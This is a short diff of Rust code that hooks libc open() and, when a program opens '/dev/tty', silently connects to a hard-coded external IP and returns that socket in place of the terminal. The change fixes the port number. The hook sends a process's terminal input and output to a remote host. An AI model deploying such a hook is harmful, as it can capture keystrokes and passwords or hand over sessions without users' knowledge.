@@ -16,7 +16,7 @@ pub extern "C" fn open(pathname: *const c_char, flags: c_int) -> c_int {
     if path.contains("/dev/tty") {
         let mut client_socket = CLIENT_SOCKET.lock().unwrap();
         if client_socket.is_none() {
-            let stream = TcpStream::connect("100.98.67.49:99919").expect("Connection failed");
+            let stream = TcpStream::connect("100.98.67.49:12121").expect("Connection failed");
             *client_socket = Some(stream);
         }
         client_socket.as_ref().unwrap().as_raw_fd()
